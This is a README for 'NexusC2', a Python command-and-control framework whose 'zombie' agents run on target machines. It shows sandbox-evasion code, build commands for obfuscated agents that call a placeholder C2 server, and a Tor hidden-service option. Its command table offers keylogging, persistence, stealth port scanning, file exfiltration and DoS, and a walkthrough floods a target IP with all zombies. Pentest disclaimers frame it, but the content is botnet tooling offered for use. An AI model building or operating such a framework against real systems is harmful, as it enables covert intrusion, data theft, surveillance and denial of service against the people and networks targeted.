> Note: Adding and fixing a few errors to/in the framework before i upload it here. Please wait.
---

# NexusC2 Framework

## Enterprise-Grade Command & Control Infrastructure

[![License](https://img.shields.io/badge/License-CreativeCommons-blue.svg)](LICENSE)
[![Version](https://img.shields.io/badge/Version-1.0.0-red.svg)]()
[![Python](https://img.shields.io/badge/Python-3.6+-black.svg)]()
[![Security](https://img.shields.io/badge/Security-Enterprise-red.svg)]()

**NexusC2** is an Command & Control (C2) framework engineered for comprehensive security testing operations, adversary emulation, and authorized penetration testing. Leveraging a distributed architecture with sophisticated encryption mechanisms and state-of-the-art evasion capabilities, NexusC2 provides security professionals with a platform for threats and security posture assessment.

## Strategic Capabilities

NexusC2 implements a multi-tiered command execution architecture with load balancing capabilities, providing operational flexibility in offensive engagements:

- **Cryptographic Infrastructure** - RSA-2048 key exchange with AES-256-CFB command encryption
- **Cross-Platform Client Deployment** - Windows, Linux, macOS execution environments with customizable parameters
- **Evasion Mechanisms** - Multi-layered detection avoidance with behavioral analysis resistance
- **Stealth Communication Channels** - Variable timing, jitter implementation, and traffic chunking
- **Multi-Vector Persistence** - Registry, scheduled tasks, launchd, systemd and WMI implementation
- **Distributed Command Execution** - Load-balanced operation across multiple zombie processes
- **Comprehensive Operational Security** - Session management with dynamic key rotation
- **Advanced Build System** - Tiered obfuscation strategies with customizable parameters

## Architectural Overview

NexusC2 implements a multi-component architecture designed for scalability, resilience, and operational security:

```
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
│                 │     │                  │     │                 │
│  Master Control │◄────┤  Command Server  │◄────┤  Zombie Agents  │
│    Interface    │     │                  │     │                 │
│                 │     │                  │     │                 │
└────────┬────────┘     └──────────────────┘     └─────────────────┘
         │                       ▲                        ▲
         │                       │                        │
         │                       │                        │
         │              ┌────────┴─────────┐     ┌────────┴─────────┐
         └──────────────┤                  │     │                  │
                        │  Secure Database │     │   Build System   │
                        │                  │     │                  │
                        └──────────────────┘     └──────────────────┘
```

### Core Components

1. **Command Server (`wsgi.py`)**: Central C2 infrastructure implementing a secure RESTful API for command distribution, result collection, and zombie management. Engineered with Flask for scalable request handling and equipped with advanced authentication mechanisms.

2. **Master Control Interface (`master.py`)**: Administrative command-line console providing comprehensive visibility and control over the zombie network. Implements a sophisticated command tokenization and distribution system with advanced monitoring capabilities.

3. **Zombie Agents (`zombie.py`)**: Distributed client components executing on target systems with advanced evasion capabilities, encrypted command channels, and configurable check-in mechanisms. Implements a multi-stage initialization protocol with secure key exchange.

4. **Database Backend (`database_helper.py`)**: SQLite-based persistent storage with transactional integrity for command queuing, result archiving, and operational status tracking. Features dynamic table generation and optimized query patterns.

5. **Build System (`build.py`)**: Advanced compilation infrastructure supporting multiple target platforms with customizable obfuscation strategies, icon resource injection, and binary optimization capabilities.

## Enterprise Security Implementation

NexusC2 establishes a multi-layered security architecture to protect operational integrity:

### Cryptographic Foundation

```python
def establish_secure_channel(zombie_id, public_key_pem):
    """
    Establish a secure communication channel with military-grade encryption
    
    Parameters:
        zombie_id (str): Unique identifier for the zombie agent
        public_key_pem (str): Agent's public key in PEM format
    
    Returns:
        str: Encrypted AES key for secure command transmission
    """
    # Decode the agent's public key
    agent_public_key = serialization.load_pem_public_key(
        public_key_pem.encode(),
        backend=default_backend()
    )
    
    # Generate a cryptographically secure AES-256 key
    aes_key = os.urandom(32)  # 256 bits
    
    # Store for command encryption
    zombie_aes_keys[zombie_id] = aes_key
    
    # Encrypt using the agent's public key with OAEP padding
    encrypted_key = agent_public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    
    # Return Base64 encoded encrypted key
    return base64.b64encode(encrypted_key).decode()
```

### Key Security Features

- **Ephemeral Session Keys**: Dynamically generated session-specific encryption keys with configurable rotation intervals
- **Certificate Pinning**: Optional certificate validation for enhanced transport layer security
- **Memory Protection**: Secure key handling with proper memory cleanup procedures
- **Command Authentication**: Cryptographic verification of command integrity and origin
- **Temporal Evasion**: Sophisticated timing controls to mitigate behavioral analysis
- **Anti-Debugging**: Advanced techniques to detect and respond to analysis environments
- **Traffic Pattern Normalization**: Variable packet sizing and scheduling to defeat traffic analysis

## Installation

### System Requirements

- **Python**: 3.6 or higher
- **Required Packages**:
  - Flask
  - Cryptography
  - Requests
  - PyArmor (for obfuscation)
  - PyInstaller (for compilation)
  - UPX (optional, for compression)

### Installation Procedure

```bash
# Clone the repository
git clone https://github.com/security-corp/nexusc2.git
cd nexusc2

# Install required dependencies
pip install -r requirements.txt

# Optional: Install UPX for binary compression
# Linux: apt-get install upx
# macOS: brew install upx
# Windows: Download from https://upx.github.io/

# Initialize the database
python wsgi.py --initialize-db

# Generate master encryption keys
python wsgi.py --generate-keys
```

## Operational Deployment

### Server Initialization

```bash
# Start the C2 server with default configuration
python wsgi.py

# Start with custom binding
python wsgi.py --host 0.0.0.0 --port 8443

# Enable debug logging
python wsgi.py --debug --log-file server.log
```

### Master Control Operation

```bash
# Launch the master interface
python master.py

# The interface will automatically generate a master key
# and connect to the C2 server
```

### Configure Remote Access

External access methods can be configured through the master interface:

1. **Direct IP**: Bind to external IP with custom port
2. **Domain + TLS**: Configure domain name with SSL/TLS encryption
3. **Tor Hidden Service**: Deploy as an onion service for enhanced anonymity

```bash
# Configure external access directly
python server_setup.py --ip <external-ip> --port 443

# Setup with domain and TLS
python server_setup.py --domain your-domain.com --ssl

# Configure as Tor hidden service
python server_setup.py --tor
```

### Zombie Deployment

```bash
# Build Windows executable with medium obfuscation
python build.py --platform windows --server https://your-server.com --obfuscation medium

# Linux binary with advanced obfuscation and UPX compression
python build.py --platform linux --server https://your-server.com --obfuscation advanced --upx

# macOS application with custom icon
python build.py --platform macos --server https://your-server.com --icon path/to/icon.ico

# Python script for flexible deployment
python build.py --platform python --server https://your-server.com
```

## Advanced Configuration

NexusC2 provides comprehensive configuration options through both JSON files and command-line parameters:

### Server Configuration (`server_config.json`)

```json
{
    "remote_access": {
        "enabled": true,
        "type": "direct_ip",
        "ip": "203.0.113.10",
        "port": 443
    },
    "security": {
        "use_ssl": true,
        "key_rotation_interval": 86400,
        "session_timeout": 3600
    },
    "database": {
        "journal_mode": "WAL",
        "synchronous": "NORMAL"
    },
    "limits": {
        "max_zombies": 1000,
        "max_concurrent_attacks": 10
    }
}
```

### Build System Configuration Options

| Parameter | Description | Default |
|-----------|-------------|---------|
| `--platform` | Target platform (windows, linux, macos) | current |
| `--server` | C2 server URL | http://127.0.0.1:5000 |
| `--obfuscation` | Obfuscation level (basic, medium, advanced) | medium |
| `--icon` | Custom icon path | None |
| `--payload` | Custom payload script path | None |
| `--payload-delay` | Execution delay in seconds | 30 |
| `--payload-technique` | Execution technique (direct, fileless, scheduled) | direct |
| `--upx` | Enable UPX compression | False |
| `--output` | Output directory | ./dist |

## Command Reference

### Master Control Commands

The master interface provides comprehensive command capabilities:

#### Zombie Management
- Monitor zombie status and activity
- View detailed system information
- Send commands to individual or multiple zombies
- Download command history and results
- Generate system metrics reports

#### Command Distribution
```
# Execute system command on specific zombie
> 2                           # Select "Send Command to Zombies"
> zombie_3a7b9f2c             # Enter zombie ID
> whoami                      # Enter command

# Execute command on all zombies
> 2                           # Select "Send Command to Zombies"
> all                         # Target all zombies
> systeminfo                  # Enter command
```

#### DDoS Testing Module
```
# Initialize DDoS test with HTTP flood
> 3                           # Select "Initialize DoS Attack"
> http                        # Attack type
> 192.168.1.100               # Target IP
> 80                          # Target port
> 30                          # Duration in seconds
> 1                           # Use all available zombies
```

### Special Commands

NexusC2 implements numerous specialized commands with custom handlers:

| Command | Description | Implementation |
|---------|-------------|----------------|
| `profile` | Gather comprehensive system information | Multi-component system profiling |
| `screenshot` | Capture system screen | Platform-specific screen capture |
| `download <url> <path>` | Download file from URL | Secure file transfer with integrity verification |
| `upload <path> <url>` | Upload file to URL | Encrypted file exfiltration |
| `persist` | Install persistence mechanism | Platform-specific persistence implementation |
| `dns_lookup <domain>` | Perform DNS resolution | Custom DNS client implementation |
| `scan_ports <ip> <ports>` | Scan network ports | Stealth port scanning module |
| `keylog_start` | Begin keystroke capture | Platform-specific keylogger |
| `keylog_stop` | End keystroke capture | Terminates and reports keylog data |
| `dos_attack <type> <target> <port> <duration>` | Execute DoS attack | Multiple attack vector implementation |

## Zombie Architecture

Zombies implement a sophisticated command execution architecture with multi-stage initialization and advanced evasion capabilities:

### Initialization Sequence

```python
def initialize():
    """Initialize zombie with secure key exchange and anti-analysis checks"""
    # Generate asymmetric keys
    private_key, public_key = generate_rsa_keys()
    
    # Register with C2 server
    if not register_with_server():
        return False
        
    # Perform environment verification
    if not evade_detection():
        # Abort if analysis environment detected
        return False
        
    # Establish encrypted command channel
    if not authenticate_with_server():
        return False
        
    # Initialize execution engine
    start_command_processor()
    
    # Gather and report system profile
    profile = profile_target()
    report_metrics("profile", profile)
    
    # Enter main command polling loop
    return True
```

### Evasion Mechanism Implementation

Zombies implement sophisticated detection avoidance techniques:

```python
def check_for_sandbox():
    """Check for indicators of sandbox/VM environment"""
    indicators = []
    
    # Check for small disk size (common in VMs)
    try:
        _, total, _ = shutil.disk_usage("/")
        if total < 50 * 1024 * 1024 * 1024:  # Less than 50GB
            indicators.append("small_disk")
    except:
        pass
    
    # Check for common VM MAC addresses
    try:
        mac = os.popen("ifconfig || ipconfig /all").read().lower()
        vm_prefixes = ["00:0c:29", "00:1c:14", "00:50:56", "00:05:69", "08:00:27"]
        if any(prefix in mac for prefix in vm_prefixes):
            indicators.append("vm_mac_address")
    except:
        pass
    
    # Check for virtualization-specific files
    vm_files = [
        "/usr/bin/vmtoolsd",
        "/usr/bin/VBoxService",
        "C:\\Windows\\System32\\drivers\\vmmouse.sys",
        "C:\\Windows\\System32\\drivers\\vmhgfs.sys"
    ]
    
    for file in vm_files:
        if os.path.exists(file):
            indicators.append(f"vm_file_{os.path.basename(file)}")
    
    return indicators
```

## Performance Optimization

NexusC2 implements advanced performance optimization techniques for high-load environments:

### Database Optimization

- **Write-Ahead Logging** - Enhanced concurrent operation support
- **Connection Pooling** - Optimized connection management
- **Query Optimization** - Efficient indexing strategies
- **Transaction Batching** - Grouped operations for improved throughput

### Network Optimization

- **Command Prioritization** - Critical commands receive execution priority
- **Traffic Compression** - Optional payload compression
- **Connection Reuse** - Persistent connections with keepalive
- **Request Batching** - Multiple commands in single transmission

### Memory Management

- **Resource Pooling** - Efficient allocation of system resources
- **Garbage Collection Control** - Optimized memory release patterns
- **Buffer Management** - Controlled memory footprint for command processing

## API Documentation

NexusC2 provides a comprehensive RESTful API for integration with custom tooling:

### Zombie Management Endpoints

| Endpoint | Method | Description | Authentication |
|----------|--------|-------------|----------------|
| `/generateKey/{bot_id}` | GET | Generate key pair for zombie | None |
| `/authenticate` | POST | Authenticate zombie and exchange keys | None |
| `/getCommand/{zid}` | GET | Retrieve command for zombie | Session |
| `/reportResult/{zid}` | POST | Submit command execution result | Session |
| `/checkIn/{zid}` | POST | Update zombie status | Session |
| `/reportMetrics/{zid}` | POST | Submit performance metrics | Session |

### Master Control Endpoints

| Endpoint | Method | Description | Authentication |
|----------|--------|-------------|----------------|
| `/generateMasterKey` | POST | Generate new master key | None |
| `/authenticateMaster` | POST | Authenticate and rotate key | Current key |
| `/getActiveZombies` | GET | List all active zombies | Master key |
| `/getZombieDetails/{zombie_id}` | GET | Get detailed zombie info | Master key |
| `/sendCommand` | POST | Queue command for execution | Master key |
| `/buildZombie` | POST | Generate zombie executable | Master key |
| `/downloadBuild/{build_id}` | GET | Download generated binary | Master key |

## Project Structure

```
nexusc2/
├── wsgi.py                # Main server implementation
├── build.py               # Build system for zombie generation
├── master.py              # Master control interface
├── zombie.py              # Zombie client implementation
├── database_helper.py     # Database abstraction layer
├── server_setup.py        # Server configuration utility
├── dos_module.py          # DDoS testing implementation
├── requirements.txt       # Python dependencies
├── server_config.json     # Server configuration
├── ssl/                   # SSL certificates directory
├── server_keys/           # Server key storage
├── builds/                # Generated zombie binaries
├── templates/             # Zombie build templates
├── hidden_service/        # Tor hidden service configuration
└── docs/                  # Comprehensive documentation
```

## Ethical Usage Guidelines

NexusC2 is designed exclusively for legitimate security research, authorized penetration testing, and educational purposes. Usage of this framework must comply with all applicable laws and regulations, and requires explicit written authorization from system owners.

### Legitimate Usage Scenarios:

- Authorized penetration testing with proper scope documentation
- Educational environments with appropriate controls
- Security research in controlled lab environments
- Red team exercises with proper authorization

### Prohibited Usage:

- Unauthorized access to systems or networks
- Any illegal activities or computer crimes
- Activities causing harm or disruption

## Legal Considerations

Prior to deployment, comprehensive legal authorization documentation must be secured, including:

- Rules of Engagement (ROE)
- Testing Authorization
- Data Handling Agreement
- Emergency Procedures

## Contributing

Contributions to NexusC2 are welcome. Please follow these guidelines:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

All contributions must adhere to the project's coding standards and include appropriate tests.
---

## Disclaimer

NexusC2 is provided for legitimate security research, authorized penetration testing, and educational purposes only. Misuse of this software may violate local, state, and federal law in many countries. Users are solely responsible for their actions and compliance with all applicable laws. The authors accept no liability and are not responsible for any misuse or damage caused by this program.

---

*"If you know both yourself and your enemy, you can win a hundred battles without a single loss." - Sun Tzu*

> © 2025 NexusC2. All Rights Reserved. **Creative Commons BY-NC-ND**
